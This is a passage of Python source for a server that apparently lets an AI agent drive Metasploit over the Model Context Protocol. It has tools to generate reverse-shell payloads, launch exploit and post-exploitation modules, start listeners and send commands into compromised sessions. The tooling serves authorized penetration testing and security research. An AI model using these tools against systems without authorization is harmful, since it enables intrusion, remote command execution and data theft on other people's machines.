    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing payloads: {e}")
        return [f"Error: Metasploit RPC error: {e}"]
    except Exception as e:
        logger.exception("Unexpected error listing payloads.")
        return [f"Error: Unexpected error listing payloads: {e}"]

@mcp.tool()
async def generate_payload(
    payload_type: str,
    format_type: str,
    options: Union[Dict[str, Any], str], # Required: e.g., {"LHOST": "1.2.3.4", "LPORT": 4444} or "LHOST=1.2.3.4,LPORT=4444"
    encoder: Optional[str] = None,
    iterations: int = 0,
    bad_chars: str = "",
    nop_sled_size: int = 0,
    template_path: Optional[str] = None,
    keep_template: bool = False,
    force_encode: bool = False,
    output_filename: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Generate a Metasploit payload using the RPC API (payload.generate).
    Saves the generated payload to a file on the server if successful.

    Args:
        payload_type: Type of payload (e.g., windows/meterpreter/reverse_tcp).
        format_type: Output format (raw, exe, python, etc.).
        options: Dictionary of required payload options (e.g., {"LHOST": "1.2.3.4", "LPORT": 4444})
                or string format "LHOST=1.2.3.4,LPORT=4444". Prefer dict format.
        encoder: Optional encoder to use.
        iterations: Optional number of encoding iterations.
        bad_chars: Optional string of bad characters to avoid (e.g., '\\x00\\x0a\\x0d').
        nop_sled_size: Optional size of NOP sled.
        template_path: Optional path to an executable template.
        keep_template: Keep the template working (requires template_path).
        force_encode: Force encoding even if not needed by bad chars.
        output_filename: Optional desired filename (without path). If None, a default name is generated.

    Returns:
        Dictionary containing status, message, payload size/info, and server-side save path.
    """
    client = get_msf_client()
    logger.info(f"Generating payload '{payload_type}' (Format: {format_type}) via RPC. Options: {options}")

    # Parse options gracefully
    try:
        parsed_options = _parse_options_gracefully(options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid options format: {e}"}

    if not parsed_options:
        return {"status": "error", "message": "Payload 'options' dictionary (e.g., LHOST, LPORT) is required."}

    try:
        # Get the payload module object
        payload = await _get_module_object('payload', payload_type)

        # Set payload-specific required options (like LHOST/LPORT)
        await _set_module_options(payload, parsed_options)

        # Set payload generation options in payload.runoptions
        # as per the pymetasploit3 documentation
        logger.info("Setting payload generation options in payload.runoptions...")
        
        # Define a function to update an individual runoption
        async def update_runoption(key, value):
            if value is None:
                return
            await asyncio.to_thread(lambda k=key, v=value: payload.runoptions.__setitem__(k, v))
            logger.debug(f"Set runoption {key}={value}")
        
        # Set generation options individually
        await update_runoption('Format', format_type)
        if encoder:
            await update_runoption('Encoder', encoder)
        if iterations:
            await update_runoption('Iterations', iterations) 
        if bad_chars is not None:
            await update_runoption('BadChars', bad_chars)
        if nop_sled_size:
            await update_runoption('NopSledSize', nop_sled_size)
        if template_path:
            await update_runoption('Template', template_path)
        if keep_template:
            await update_runoption('KeepTemplateWorking', keep_template)
        if force_encode:
            await update_runoption('ForceEncode', force_encode)
        
        # Generate the payload bytes using payload.payload_generate()
        logger.info("Calling payload.payload_generate()...")
        raw_payload_bytes = await asyncio.to_thread(lambda: payload.payload_generate())

        if not isinstance(raw_payload_bytes, bytes):
            error_msg = f"Payload generation failed. Expected bytes, got {type(raw_payload_bytes)}: {str(raw_payload_bytes)[:200]}"
            logger.error(error_msg)
            # Try to extract specific error from potential dictionary response
            if isinstance(raw_payload_bytes, dict) and raw_payload_bytes.get('error'):
                 error_msg = raw_payload_bytes.get('error_message', str(raw_payload_bytes))
            return {"status": "error", "message": f"Payload generation failed: {error_msg}"}

        payload_size = len(raw_payload_bytes)
        logger.info(f"Payload generation successful. Size: {payload_size} bytes.")

        # --- Save Payload ---
        # Ensure directory exists
        try:
            os.makedirs(PAYLOAD_SAVE_DIR, exist_ok=True)
            logger.debug(f"Ensured payload directory exists: {PAYLOAD_SAVE_DIR}")
        except OSError as e:
            logger.error(f"Failed to create payload save directory {PAYLOAD_SAVE_DIR}: {e}")
            return {
                "status": "error",
                "message": f"Payload generated ({payload_size} bytes) but could not create save directory: {e}",
                "payload_size": payload_size, "format": format_type
            }

        # Determine filename (with basic sanitization)
        final_filename = None
        if output_filename:
            sanitized = re.sub(r'[^a-zA-Z0-9_.\-]', '_', os.path.basename(output_filename)) # Basic sanitize + basename
            if sanitized: final_filename = sanitized

        if not final_filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_payload_type = re.sub(r'[^a-zA-Z0-9_]', '_', payload_type)
            safe_format = re.sub(r'[^a-zA-Z0-9_]', '_', format_type)
            final_filename = f"payload_{safe_payload_type}_{timestamp}.{safe_format}"

        save_path = os.path.join(PAYLOAD_SAVE_DIR, final_filename)

        # Write payload to file
        try:
            with open(save_path, "wb") as f:
                f.write(raw_payload_bytes)
            logger.info(f"Payload saved to {save_path}")
            return {
                "status": "success",
                "message": f"Payload '{payload_type}' generated successfully and saved.",
                "payload_size": payload_size,
                "format": format_type,
                "server_save_path": save_path
            }
        except IOError as e:
            logger.error(f"Failed to write payload to {save_path}: {e}")
            return {
                "status": "error",
                "message": f"Payload generated but failed to save to file: {e}",
                "payload_size": payload_size, "format": format_type
            }

    except (ValueError, MsfRpcError) as e: # Catches errors from _get_module_object, _set_module_options
        error_str = str(e).lower()
        logger.error(f"Error generating payload {payload_type}: {e}")
        if "invalid payload type" in error_str or "unknown module" in error_str:
             return {"status": "error", "message": f"Invalid payload type: {payload_type}"}
        elif "missing required option" in error_str or "invalid option" in error_str:
             missing = getattr(payload, 'missing_required', []) if 'payload' in locals() else []
             return {"status": "error", "message": f"Missing/invalid options for payload {payload_type}: {e}", "missing_required": missing}
        return {"status": "error", "message": f"Error generating payload: {e}"}
    except AttributeError as e: # Specifically catch if payload_generate is missing
        logger.exception(f"AttributeError during payload generation for '{payload_type}': {e}")
        if "object has no attribute 'payload_generate'" in str(e):
            return {"status": "error", "message": f"The pymetasploit3 payload module doesn't have the payload_generate method. Please check library version/compatibility."}
        return {"status": "error", "message": f"An attribute error occurred: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error during payload generation for '{payload_type}'.")
        return {"status": "error", "message": f"An unexpected server error occurred during payload generation: {e}"}

@mcp.tool()
async def run_exploit(
    module_name: str,
    options: Dict[str, Any],
    payload_name: Optional[str] = None,
    payload_options: Optional[Union[Dict[str, Any], str]] = None,
    run_as_job: bool = False,
    check_vulnerability: bool = False, # New option
    timeout_seconds: int = LONG_CONSOLE_READ_TIMEOUT # Used only if run_as_job=False
) -> Dict[str, Any]:
    """
    Run a Metasploit exploit module with specified options. Handles async (job)
    and sync (console) execution, and includes session polling for jobs.

    Args:
        module_name: Name/path of the exploit module (e.g., 'unix/ftp/vsftpd_234_backdoor').
        options: Dictionary of exploit module options (e.g., {'RHOSTS': '192.168.1.1'}).
        payload_name: Name of the payload (e.g., 'linux/x86/meterpreter/reverse_tcp').
        payload_options: Dictionary of payload options (e.g., {'LHOST': '...', 'LPORT': ...})
                        or string format "LHOST=1.2.3.4,LPORT=4444". Prefer dict format.
        run_as_job: If False (default), run sync via console. If True, run async via RPC.
        check_vulnerability: If True, run module's 'check' action first (if available).
        timeout_seconds: Max time for synchronous run via console.

    Returns:
        Dictionary with execution results (job_id, session_id, output) or error details.
    """
    logger.info(f"Request to run exploit '{module_name}'. Job: {run_as_job}, Check: {check_vulnerability}, Payload: {payload_name}")

    # Parse payload options gracefully
    try:
        parsed_payload_options = _parse_options_gracefully(payload_options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid payload_options format: {e}"}

    payload_spec = None
    if payload_name:
        payload_spec = {"name": payload_name, "options": parsed_payload_options}

    if check_vulnerability:
        logger.info(f"Performing vulnerability check first for {module_name}...")
        try:
             # Use the console helper for 'check' as it provides output
             check_result = await _execute_module_console(
                 module_type='exploit',
                 module_name=module_name,
                 module_options=options,
                 command='check', # Use the 'check' command
                 timeout=timeout_seconds
             )
             logger.info(f"Vulnerability check result: {check_result.get('status')} - {check_result.get('message')}")
             output = check_result.get("module_output", "").lower()
             # Check output for positive indicators
             is_vulnerable = "appears vulnerable" in output or "is vulnerable" in output or "+ vulnerable" in output
             # Check for negative indicators (more reliable sometimes)
             is_not_vulnerable = "does not appear vulnerable" in output or "is not vulnerable" in output or "target is not vulnerable" in output or "check failed" in output
             if check_result.get('status') == "errror":
                 logger.warning(f"Error from metasploit: {check_result}")
                 return {"status": "aborted", "message": f"Check indicates a failure: {check_result.get('message')}", "check_output": check_result.get("module_output")}

             if is_not_vulnerable or (not is_vulnerable and check_result.get("status") == "error"):
                 logger.warning(f"Check indicates target is likely not vulnerable to {module_name}.")
                 return {"status": "aborted", "message": f"Check indicates target not vulnerable. Exploit not attempted.", "check_output": check_result.get("module_output")}
             elif not is_vulnerable:
                 logger.warning(f"Check result inconclusive for {module_name}. Proceeding with exploit attempt cautiously.")
             else:
                 logger.info(f"Check indicates target appears vulnerable to {module_name}. Proceeding.")
             # Optionally return check output here if needed by the agent

        except Exception as chk_e:
             logger.warning(f"Vulnerability check failed for {module_name}: {chk_e}. Proceeding with exploit attempt.")
             # Fall through to exploit attempt

    # Execute the exploit
    if run_as_job:
        return await _execute_module_rpc(
            module_type='exploit',
            module_name=module_name,
            module_options=options,
            payload_spec=payload_spec
        )
    else:
        return await _execute_module_console(
            module_type='exploit',
            module_name=module_name,
            module_options=options,
            command='exploit',
            payload_spec=payload_spec,
            timeout=timeout_seconds
        )

@mcp.tool()
async def run_post_module(
    module_name: str,
    session_id: int,
    options: Dict[str, Any] = None,
    run_as_job: bool = False,
    timeout_seconds: int = LONG_CONSOLE_READ_TIMEOUT
) -> Dict[str, Any]:
    """
    Run a Metasploit post-exploitation module against a session.

    Args:
        module_name: Name/path of the post module (e.g., 'windows/gather/enum_shares').
        session_id: The ID of the target session.
        options: Dictionary of module options. 'SESSION' will be added automatically.
        run_as_job: If False (default), run sync via console. If True, run async via RPC.
        timeout_seconds: Max time for synchronous run via console.

    Returns:
        Dictionary with execution results or error details.
    """
    logger.info(f"Request to run post module {module_name} on session {session_id}. Job: {run_as_job}")
    module_options = options or {}
    module_options['SESSION'] = session_id # Ensure SESSION is always set

    # Add basic session validation before running
    client = get_msf_client()
    try:
        current_sessions = await asyncio.to_thread(lambda: client.sessions.list)
        if str(session_id) not in current_sessions:
             logger.error(f"Session {session_id} not found for post module {module_name}.")
             return {"status": "error", "message": f"Session {session_id} not found.", "module": module_name}
    except MsfRpcError as e:
        logger.error(f"Failed to validate session {session_id} before running post module: {e}")
        # Optionally proceed with caution or return error
        return {"status": "error", "message": f"Error validating session {session_id}: {e}", "module": module_name}


    if run_as_job:
        return await _execute_module_rpc(
            module_type='post',
            module_name=module_name,
            module_options=module_options
            # No payload for post modules
        )
    else:
        return await _execute_module_console(
            module_type='post',
            module_name=module_name,
            module_options=module_options,
            command='run',
            timeout=timeout_seconds
        )

@mcp.tool()
async def run_auxiliary_module(
    module_name: str,
    options: Dict[str, Any],
    run_as_job: bool = False, # Default False for scanners often makes sense
    check_target: bool = False, # Add check option similar to exploit
    timeout_seconds: int = LONG_CONSOLE_READ_TIMEOUT
) -> Dict[str, Any]:
    """
    Run a Metasploit auxiliary module.

    Args:
        module_name: Name/path of the auxiliary module (e.g., 'scanner/ssh/ssh_login').
        options: Dictionary of module options (e.g., {'RHOSTS': ..., 'USERNAME': ...}).
        run_as_job: If False (default), run sync via console. If True, run async via RPC.
        check_target: If True, run module's 'check' action first (if available).
        timeout_seconds: Max time for synchronous run via console.

    Returns:
        Dictionary with execution results or error details.
    """
    logger.info(f"Request to run auxiliary module {module_name}. Job: {run_as_job}, Check: {check_target}")
    module_options = options or {}

    if check_target:
        logger.info(f"Performing check first for auxiliary module {module_name}...")
        try:
             # Use the console helper for 'check'
             check_result = await _execute_module_console(
                 module_type='auxiliary',
                 module_name=module_name,
                 module_options=options,
                 command='check',
                 timeout=timeout_seconds
             )
             logger.info(f"Auxiliary check result: {check_result.get('status')} - {check_result.get('message')}")
             output = check_result.get("module_output", "").lower()
             # Generic check for positive outcome (aux check output varies widely)
             is_positive = "host is likely vulnerable" in output or "target appears reachable" in output or "+ check" in output
             is_negative = "host is not vulnerable" in output or "target is not reachable" in output or "check failed" in output

             if is_negative or (not is_positive and check_result.get("status") == "error"):
                 logger.warning(f"Check indicates target may not be suitable for {module_name}.")
                 return {"status": "aborted", "message": f"Check indicates target unsuitable. Module not run.", "check_output": check_result.get("module_output")}
             elif not is_positive:
                 logger.warning(f"Check result inconclusive for {module_name}. Proceeding with run.")
             else:
                 logger.info(f"Check appears positive for {module_name}. Proceeding.")

        except Exception as chk_e:
             logger.warning(f"Check failed for auxiliary {module_name}: {chk_e}. Proceeding with run attempt.")

    if run_as_job:
        return await _execute_module_rpc(
            module_type='auxiliary',
            module_name=module_name,
            module_options=module_options
            # No payload for aux modules
        )
    else:
        return await _execute_module_console(
            module_type='auxiliary',
            module_name=module_name,
            module_options=module_options,
            command='run',
            timeout=timeout_seconds
        )

@mcp.tool()
async def list_active_sessions() -> Dict[str, Any]:
    """List active Metasploit sessions with their details."""
    client = get_msf_client()
    logger.info("Listing active Metasploit sessions.")
    try:
        logger.debug(f"Calling client.sessions.list with {RPC_CALL_TIMEOUT}s timeout...")
        sessions_dict = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.sessions.list),
            timeout=RPC_CALL_TIMEOUT
        )
        if not isinstance(sessions_dict, dict):
            logger.error(f"Expected dict from sessions.list, got {type(sessions_dict)}")
            return {"status": "error", "message": f"Unexpected data type for sessions list: {type(sessions_dict)}"}

        logger.info(f"Found {len(sessions_dict)} active sessions.")
        # Ensure keys are strings for consistent JSON
        sessions_dict_str_keys = {str(k): v for k, v in sessions_dict.items()}
        return {"status": "success", "sessions": sessions_dict_str_keys, "count": len(sessions_dict_str_keys)}
    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing sessions from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return {"status": "error", "message": error_msg}
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing sessions: {e}")
        return {"status": "error", "message": f"Metasploit RPC error: {e}"}
    except Exception as e:
        logger.exception("Unexpected error listing sessions.")
        return {"status": "error", "message": f"Unexpected error listing sessions: {e}"}

@mcp.tool()
async def send_session_command(
    session_id: int,
    command: str,
    timeout_seconds: int = SESSION_COMMAND_TIMEOUT,
) -> Dict[str, Any]:
    """
    Send a command to an active Metasploit session (Meterpreter or Shell) and get output.
    Uses session.run_with_output for Meterpreter, and a prompt-aware loop for shells.
    The agent is responsible for parsing the raw output.

    In Meterpreter mode, to run a shell command, run `shell` to enter the shell mode first.
    To exit shell mode and return to Meterpreter, run `exit`.

    Args:
        session_id: ID of the target session.
        command: Command string to execute in the session.
        timeout_seconds: Maximum time to wait for the command to complete.

    Returns:
        Dictionary with status ('success', 'error', 'timeout') and raw command output.
    """
    client = get_msf_client()
    logger.info(f"Sending command to session {session_id}: '{command}'")
    session_id_str = str(session_id)

    try:
        # --- Get Session Info and Object ---
        current_sessions = await asyncio.to_thread(lambda: client.sessions.list)
        if session_id_str not in current_sessions:
            logger.error(f"Session {session_id} not found.")
            return {"status": "error", "message": f"Session {session_id} not found."}

        session_info = current_sessions[session_id_str]
        session_type = session_info.get('type', 'unknown').lower() if isinstance(session_info, dict) else 'unknown'
        logger.debug(f"Session {session_id} type: {session_type}")

        session = await asyncio.to_thread(lambda: client.sessions.session(session_id_str))
        if not session:
            logger.error(f"Failed to get session object for existing session {session_id}.")
            return {"status": "error", "message": f"Error retrieving session {session_id} object."}

        # --- Execute Command Based on Type ---
        output = ""
        status = "error" # Default status
        message = "Command execution failed or type unknown."

        if session_type == 'meterpreter':
            if session_shell_type.get(session_id_str) is None:
                session_shell_type[session_id_str] = 'meterpreter'

            logger.debug(f"Using session.run_with_output for Meterpreter session {session_id}")
            try:
                # Use asyncio.wait_for to handle timeout manually since run_with_output doesn't support timeout parameter
                if command == "shell":
                    if session_shell_type[session_id_str] == 'meterpreter':
                        output = session.run_with_output(command, end_strs=['created.'])
                        session_shell_type[session_id_str] = 'shell'
                        session.read()  # Clear buffer
                    else:
                        output = "You are already in shell mode."
                elif command == "exit":
                    if session_shell_type[session_id_str] == 'meterpreter':
                        output = "You are already in meterpreter mode. No need to exit."
                    else:
                        session.read()  # Clear buffer
                        session.detach()
                        session_shell_type[session_id_str] = 'meterpreter'
                else:
                    output = await asyncio.wait_for(
                        asyncio.to_thread(lambda: session.run_with_output(command)),
                        timeout=timeout_seconds
                    )
                status = "success"
                message = "Meterpreter command executed successfully."
                logger.debug(f"Meterpreter command '{command}' completed.")
            except asyncio.TimeoutError:
                status = "timeout"
                message = f"Meterpreter command timed out after {timeout_seconds} seconds."
                logger.warning(f"Command '{command}' timed out on Meterpreter session {session_id}")
                # Try a final read for potentially partial output
                try:
                    output = await asyncio.to_thread(lambda: session.read()) or ""
                except: pass
            except (MsfRpcError, Exception) as run_err:
                logger.error(f"Error during Meterpreter run_with_output for command '{command}': {run_err}")
                message = f"Error executing Meterpreter command: {run_err}"
                # Try a final read
                try:
                    output = await asyncio.to_thread(lambda: session.read()) or ""
                except: pass

        elif session_type == 'shell':
            logger.debug(f"Using manual read loop for Shell session {session_id}")
            try:
                await asyncio.to_thread(lambda: session.write(command + "\n"))

                # If the command is exit, don't wait for output/prompt, assume it worked
                if command.strip().lower() == 'exit':
                    logger.info(f"Sent 'exit' to shell session {session_id}, assuming success without reading output.")
                    status = "success"
                    message = "Exit command sent to shell session."
                    output = "(No output expected after exit)"
                    # Skip the read loop for exit command
                    return {"status": status, "message": message, "output": output}

                # Proceed with read loop for non-exit commands
                output_buffer = ""
                start_time = asyncio.get_event_loop().time()
                last_data_time = start_time
                read_interval = 0.1

                while True:
                    now = asyncio.get_event_loop().time()
                    if (now - start_time) > timeout_seconds:
                        status = "timeout"
                        message = f"Shell command timed out after {timeout_seconds} seconds."
                        logger.warning(f"Command '{command}' timed out on Shell session {session_id}")
                        break

                    chunk = await asyncio.to_thread(lambda: session.read())
                    if chunk:
                         output_buffer += chunk
                         last_data_time = now
                         # Check if the prompt appears at the end of the current buffer
                         if SHELL_PROMPT_RE.search(output_buffer):
                             logger.debug(f"Detected shell prompt for command '{command}'.")
                             status = "success"
                             message = "Shell command executed successfully."
                             break
                    elif (now - last_data_time) > SESSION_READ_INACTIVITY_TIMEOUT:
                         logger.debug(f"Shell inactivity timeout ({SESSION_READ_INACTIVITY_TIMEOUT}s) reached for command '{command}'. Assuming complete.")
                         status = "success" # Assume success if inactive after sending command
                         message = "Shell command likely completed (inactivity)."
                         break

                    await asyncio.sleep(read_interval)
                output = output_buffer # Assign final buffer to output
            except (MsfRpcError, Exception) as run_err:
                # Special handling for errors after sending 'exit'
                if command.strip().lower() == 'exit':
                    logger.warning(f"Error occurred after sending 'exit' to shell {session_id}: {run_err}. This might be expected as session closes.")
                    status = "success" # Treat as success
                    message = f"Exit command sent, subsequent error likely due to session closing: {run_err}"
                    output = "(Error reading after exit, likely expected)"
                else:
                    logger.error(f"Error during Shell write/read loop for command '{command}': {run_err}")
                    message = f"Error executing Shell command: {run_err}"
                    output = output_buffer # Return potentially partial output

        else: # Unknown session type
            logger.warning(f"Cannot execute command: Unknown session type '{session_type}' for session {session_id}")
            message = f"Cannot execute command: Unknown session type '{session_type}'."

        return {"status": status, "message": message, "output": output}

    except MsfRpcError as e:
        if "Session ID is not valid" in str(e):
             logger.error(f"RPC Error: Session {session_id} is invalid: {e}")
             return {"status": "error", "message": f"Session {session_id} is not valid."}
        logger.error(f"MsfRpcError interacting with session {session_id}: {e}")
        return {"status": "error", "message": f"Error interacting with session {session_id}: {e}"}
    except KeyError: # May occur if session disappears between list and access
        logger.error(f"Session {session_id} likely disappeared (KeyError).")
        return {"status": "error", "message": f"Session {session_id} not found or disappeared."}
    except Exception as e:
        logger.exception(f"Unexpected error sending command to session {session_id}.")
        return {"status": "error", "message": f"Unexpected server error sending command: {e}"}


# --- Job and Listener Management Tools ---

@mcp.tool()
async def list_listeners() -> Dict[str, Any]:
    """List all active Metasploit jobs, categorizing exploit/multi/handler jobs."""
    client = get_msf_client()
    logger.info("Listing active listeners/jobs")
    try:
        logger.debug(f"Calling client.jobs.list with {RPC_CALL_TIMEOUT}s timeout...")
        jobs = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.jobs.list),
            timeout=RPC_CALL_TIMEOUT
        )
        if not isinstance(jobs, dict):
            logger.error(f"Unexpected data type for jobs list: {type(jobs)}")
            return {"status": "error", "message": f"Unexpected data type for jobs list: {type(jobs)}"}

        logger.info(f"Retrieved {len(jobs)} active jobs from MSF.")
        handlers = {}
        other_jobs = {}

        for job_id, job_info in jobs.items():
            job_id_str = str(job_id)
            job_data = { 'job_id': job_id_str, 'name': 'Unknown', 'details': job_info } # Store raw info

            is_handler = False
            if isinstance(job_info, dict):
                 job_data['name'] = job_info.get('name', 'Unknown Job')
                 job_data['start_time'] = job_info.get('start_time') # Keep if useful
                 datastore = job_info.get('datastore', {})
                 if isinstance(datastore, dict): job_data['datastore'] = datastore # Include datastore

                 # Primary check: module path in name or info
                 job_name_or_info = (job_info.get('name', '') + job_info.get('info', '')).lower()
                 if 'exploit/multi/handler' in job_name_or_info:
                     is_handler = True
                 # Secondary check: presence of typical handler options
                 elif 'payload' in datastore or ('lhost' in datastore and 'lport' in datastore):
                     is_handler = True
                     logger.debug(f"Job {job_id_str} identified as potential handler via datastore options.")

            if is_handler:
                 logger.debug(f"Categorized job {job_id_str} as a handler.")
                 handlers[job_id_str] = job_data
            else:
                 logger.debug(f"Categorized job {job_id_str} as non-handler.")
                 other_jobs[job_id_str] = job_data

        return {
            "status": "success",
            "handlers": handlers,
            "other_jobs": other_jobs,
            "handler_count": len(handlers),
            "other_job_count": len(other_jobs),
            "total_job_count": len(jobs)
        }

    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing jobs from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return {"status": "error", "message": error_msg}
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing jobs/handlers: {e}")
        return {"status": "error", "message": f"Metasploit RPC error: {e}"}
    except Exception as e:
        logger.exception("Unexpected error listing jobs/handlers.")
        return {"status": "error", "message": f"Unexpected server error listing jobs: {e}"}

@mcp.tool()
async def start_listener(
    payload_type: str,
    lhost: str,
    lport: int,
    additional_options: Optional[Union[Dict[str, Any], str]] = None,
    exit_on_session: bool = False # Option to keep listener running
) -> Dict[str, Any]:
    """
    Start a new Metasploit handler (exploit/multi/handler) as a background job.

    Args:
        payload_type: The payload to handle (e.g., 'windows/meterpreter/reverse_tcp').
        lhost: Listener host address.
        lport: Listener port (1-65535).
        additional_options: Optional dict of additional payload options (e.g., {"LURI": "/path"})
                           or string format "LURI=/path,HandlerSSLCert=cert.pem". Prefer dict format.
        exit_on_session: If True, handler exits after first session. If False (default), it keeps running.

    Returns:
        Dictionary with handler status (job_id) or error details.
    """
    logger.info(f"Request to start listener for {payload_type} on {lhost}:{lport}. ExitOnSession: {exit_on_session}")

    if not (1 <= lport <= 65535):
        return {"status": "error", "message": "Invalid LPORT. Must be between 1 and 65535."}

    # Parse additional options gracefully
    try:
        parsed_additional_options = _parse_options_gracefully(additional_options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid additional_options format: {e}"}

    # exploit/multi/handler options
    module_options = {'ExitOnSession': exit_on_session}
    # Payload options (passed within the payload_spec)
    payload_options = parsed_additional_options
    payload_options['LHOST'] = lhost
    payload_options['LPORT'] = lport

    payload_spec = {"name": payload_type, "options": payload_options}

    # Use the RPC helper to start the handler job
    result = await _execute_module_rpc(
        module_type='exploit',
        module_name='multi/handler', # Use base name for helper
        module_options=module_options,
        payload_spec=payload_spec
    )

    # Rename status/message slightly for clarity
    if result.get("status") == "success":
         result["message"] = f"Listener for {payload_type} started as job {result.get('job_id')} on {lhost}:{lport}."
    elif result.get("status") == "warning": # e.g., job started but polling failed (not applicable here but handle)
         result["message"] = f"Listener job {result.get('job_id')} started, but encountered issues: {result.get('message')}"
    else: # Error case
         result["message"] = f"Failed to start listener: {result.get('message')}"

    return result

@mcp.tool()
async def stop_job(job_id: int) -> Dict[str, Any]:
    """
    Stop a running Metasploit job (handler or other). Verifies disappearance.
    """
    client = get_msf_client()
    logger.info(f"Attempting to stop job {job_id}")
    job_id_str = str(job_id)
    job_name = "Unknown"

    try:
        # Check if job exists and get name
        jobs_before = await asyncio.to_thread(lambda: client.jobs.list)
        if job_id_str not in jobs_before:
            logger.error(f"Job {job_id} not found, cannot stop.")
            return {"status": "error", "message": f"Job {job_id} not found."}
        if isinstance(jobs_before.get(job_id_str), dict):
             job_name = jobs_before[job_id_str].get('name', 'Unknown Job')

        # Attempt to stop the job
        logger.debug(f"Calling jobs.stop({job_id_str})")
        stop_result_str = await asyncio.to_thread(lambda: client.jobs.stop(job_id_str))
        logger.debug(f"jobs.stop() API call returned: {stop_result_str}")

        # Verify job stopped by checking list again
        await asyncio.sleep(1.0) # Give MSF time to process stop
        jobs_after = await asyncio.to_thread(lambda: client.jobs.list)
        job_stopped = job_id_str not in jobs_after

        if job_stopped:
            logger.info(f"Successfully stopped job {job_id} ('{job_name}') - verified by disappearance")
            return {
                "status": "success",
                "message": f"Successfully stopped job {job_id} ('{job_name}')",
                "job_id": job_id,
                "job_name": job_name,
                "api_result": stop_result_str
            }
        else:
            # Job didn't disappear. The API result string might give a hint, but is unreliable.
            logger.error(f"Failed to stop job {job_id}. Job still present after stop attempt. API result: '{stop_result_str}'")
            return {
                "status": "error",
                "message": f"Failed to stop job {job_id}. Job may still be running. API result: '{stop_result_str}'",
                "job_id": job_id,
                "job_name": job_name,
                "api_result": stop_result_str
            }

    except MsfRpcError as e:
        logger.error(f"MsfRpcError stopping job {job_id}: {e}")
        return {"status": "error", "message": f"Error stopping job {job_id}: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error stopping job {job_id}.")
        return {"status": "error", "message": f"Unexpected server error stopping job {job_id}: {e}"}

@mcp.tool()
async def terminate_session(session_id: int) -> Dict[str, Any]:
    """
    Forcefully terminate a Metasploit session using the session.stop() method.
    
    Args:
        session_id: ID of the session to terminate.
        
    Returns:
        Dictionary with status and result message.
    """
    client = get_msf_client()
    session_id_str = str(session_id)
    logger.info(f"Terminating session {session_id}")
    
    try:
        # Check if session exists
        current_sessions = await asyncio.to_thread(lambda: client.sessions.list)
        if session_id_str not in current_sessions:
            logger.error(f"Session {session_id} not found.")
            return {"status": "error", "message": f"Session {session_id} not found."}
            
        # Get a handle to the session
        session = await asyncio.to_thread(lambda: client.sessions.session(session_id_str))
        
        # Stop the session
        await asyncio.to_thread(lambda: session.stop())
        
        # Verify termination
        await asyncio.sleep(1.0)  # Give MSF time to process termination
        current_sessions_after = await asyncio.to_thread(lambda: client.sessions.list)
        
        if session_id_str not in current_sessions_after:
            logger.info(f"Successfully terminated session {session_id}")
            return {"status": "success", "message": f"Session {session_id} terminated successfully."}
        else:
            logger.warning(f"Session {session_id} still appears in the sessions list after termination attempt.")
            return {"status": "warning", "message": f"Session {session_id} may not have been terminated properly."}
            
    except MsfRpcError as e:
        logger.error(f"MsfRpcError terminating session {session_id}: {e}")
        return {"status": "error", "message": f"Error terminating session {session_id}: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error terminating session {session_id}")
        return {"status": "error", "message": f"Unexpected error terminating session {session_id}: {e}"}

# --- FastAPI Application Setup ---

app = FastAPI(
    title="Metasploit MCP Server (Streamlined)",
    description="Provides core Metasploit functionality via the Model Context Protocol.",
    version="1.6.0", # Incremented version
)

# Setup MCP transport (SSE for HTTP mode)
sse = SseServerTransport("/messages/")

# Define ASGI handlers properly with Starlette's ASGIApp interface
class SseEndpoint:
    async def __call__(self, scope, receive, send):
        """Handle Server-Sent Events connection for MCP communication."""
        client_host = scope.get('client')[0] if scope.get('client') else 'unknown'
        client_port = scope.get('client')[1] if scope.get('client') else 'unknown'
        logger.info(f"New SSE connection from {client_host}:{client_port}")
        async with sse.connect_sse(scope, receive, send) as (read_stream, write_stream):
            await mcp._mcp_server.run(read_stream, write_stream, mcp._mcp_server.create_initialization_options())
        logger.info(f"SSE connection closed from {client_host}:{client_port}")

class MessagesEndpoint:
    async def __call__(self, scope, receive, send):
        """Handle client POST messages for MCP communication."""
        client_host = scope.get('client')[0] if scope.get('client') else 'unknown'
        client_port = scope.get('client')[1] if scope.get('client') else 'unknown'
        logger.info(f"Received POST message from {client_host}:{client_port}")
        await sse.handle_post_message(scope, receive, send)

# Create routes using the ASGIApp-compliant classes
mcp_router = Router([
    Route("/sse", endpoint=SseEndpoint(), methods=["GET"]),
    Route("/messages/", endpoint=MessagesEndpoint(), methods=["POST"]),
])

# Mount the MCP router to the main app
app.routes.append(Mount("/", app=mcp_router))

@app.get("/healthz", tags=["Health"])
async def health_check():
    """Check connectivity to the Metasploit RPC service."""
    try:
        client = get_msf_client() # Will raise ConnectionError if not init
        logger.debug(f"Executing health check MSF call (core.version) with {RPC_CALL_TIMEOUT}s timeout...")
        # Use a lightweight call like core.version
        version_info = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.core.version),
            timeout=RPC_CALL_TIMEOUT
        )
        msf_version = version_info.get('version', 'N/A') if isinstance(version_info, dict) else 'N/A'
        logger.info(f"Health check successful. MSF Version: {msf_version}")
        return {"status": "ok", "msf_version": msf_version}
    except asyncio.TimeoutError:
        error_msg = f"Health check timeout ({RPC_CALL_TIMEOUT}s) - Metasploit server is not responding"
        logger.error(error_msg)
        raise HTTPException(status_code=503, detail=error_msg)
    except (MsfRpcError, ConnectionError) as e:
        logger.error(f"Health check failed - MSF RPC connection error: {e}")
        raise HTTPException(status_code=503, detail=f"Metasploit Service Unavailable: {e}")
    except Exception as e:
        logger.exception("Unexpected error during health check.")
